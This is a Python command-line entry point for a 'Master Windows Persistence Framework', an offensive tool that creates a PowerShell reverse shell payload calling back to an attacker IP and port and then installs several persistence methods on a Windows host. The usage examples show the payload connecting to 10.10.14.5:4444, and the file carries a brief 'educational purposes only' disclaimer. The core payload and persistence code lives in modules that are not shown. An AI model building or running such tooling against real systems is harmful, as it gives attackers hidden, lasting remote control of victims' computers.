"""
Master Windows Persistence Framework - CLI Entry Point
Orchestrates multiple persistence methods for maximum reliability
"""

import sys
import os
import argparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.orchestrator import MasterPersistence
from config import DEFAULT_ATTACKER_IP, DEFAULT_ATTACKER_PORT


def parse_arguments():
    """Parse command-line arguments"""
    parser = argparse.ArgumentParser(
        description="Master Windows Persistence Framework - Comprehensive Persistence Installation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Create payload first
  python main.py --create-payload --attacker-ip 10.10.14.5 --attacker-port 4444
  
  # Install comprehensive persistence
  python main.py --install C:\\Windows\\Temp\\payload.ps1 --attacker-ip 10.10.14.5
  
  # Create and install in one step
  python main.py --create-and-install --attacker-ip 10.10.14.5 --attacker-port 4444

Educational purposes only. Unauthorized use is illegal.
        """
    )
    
    # Operation modes
    parser.add_argument(
        '--install',
        type=str,
        metavar='PAYLOAD',
        help='Install comprehensive persistence (provide payload path)'
    )
    
    parser.add_argument(
        '--create-payload',
        action='store_true',
        help='Create PowerShell reverse shell payload'
    )
    
    parser.add_argument(
        '--create-and-install',
        action='store_true',
        help='Create payload and install persistence in one step'
    )
    
    # Network configuration
    parser.add_argument(
        '--attacker-ip',
        type=str,
        default=DEFAULT_ATTACKER_IP,
        help=f'Attacker IP address (default: {DEFAULT_ATTACKER_IP})'
    )
    
    parser.add_argument(
        '--attacker-port',
        type=int,
        default=DEFAULT_ATTACKER_PORT,
        help=f'Attacker port (default: {DEFAULT_ATTACKER_PORT})'
    )
    
    # Additional options
    parser.add_argument(
        '--show-methods',
        action='store_true',
        help='Show all available persistence methods'
    )
    
    return parser.parse_args()


def show_available_methods():
    """Display all available persistence methods"""
    from config import PERSISTENCE_METHODS
    from core.utils import check_admin
    
    is_admin = check_admin()
    
    print("\n" + "="*60)
    print("AVAILABLE PERSISTENCE METHODS")
    print("="*60 + "\n")
    
    print(f"Current Privileges: {'Administrator' if is_admin else 'Standard User'}\n")
    
    for i, (key, info) in enumerate(PERSISTENCE_METHODS.items(), 1):
        status = "✓" if not info['requires_admin'] or is_admin else "✗"
        admin_req = " [ADMIN]" if info['requires_admin'] else ""
        
        print(f"{i}. {status} {info['name']}{admin_req}")
        print(f"   {info['description']}")
        print()


def handle_create_payload(attacker_ip, attacker_port):
    """Handle payload creation"""
    print("[*] Creating PowerShell reverse shell payload...")
    
    master = MasterPersistence()
    payload_path = master.create_payload(attacker_ip, attacker_port)
    
    if payload_path:
        print(f"\n[+] Payload created: {payload_path}")
        print(f"\n[*] To install persistence, run:")
        print(f"    python main.py --install {payload_path} --attacker-ip {attacker_ip}")
        return payload_path
    else:
        print("\n[!] Payload creation failed")
        return None


def handle_install(payload_path, attacker_ip, attacker_port):
    """Handle persistence installation"""
    if not os.path.exists(payload_path):
        print(f"[!] Error: Payload file not found: {payload_path}")
        return False
    
    master = MasterPersistence()
    success = master.install_comprehensive_persistence(
        payload_path,
        attacker_ip,
        attacker_port
    )
    
    if success:
        master.test_persistence()
        return True
    
    return False


def handle_create_and_install(attacker_ip, attacker_port):
    """Handle payload creation and installation in one step"""
    # Create payload
    payload_path = handle_create_payload(attacker_ip, attacker_port)
    
    if not payload_path:
        return False
    
    print("\n[*] Proceeding with persistence installation...\n")
    
    # Install persistence
    return handle_install(payload_path, attacker_ip, attacker_port)


def main():
    """Main entry point"""
    args = parse_arguments()
    
    # Show methods
    if args.show_methods:
        show_available_methods()
        return 0
    
    # Create and install
    if args.create_and_install:
        success = handle_create_and_install(args.attacker_ip, args.attacker_port)
        return 0 if success else 1
    
    # Create payload only
    if args.create_payload:
        payload_path = handle_create_payload(args.attacker_ip, args.attacker_port)
        return 0 if payload_path else 1
    
    # Install persistence
    if args.install:
        success = handle_install(args.install, args.attacker_ip, args.attacker_port)
        return 0 if success else 1
    
    # No arguments - show help
    print("Master Windows Persistence Framework\n")
    print("Use --help to see available options")
    print("Use --show-methods to see all persistence methods")
    return 0


if __name__ == "__main__":
    sys.exit(main())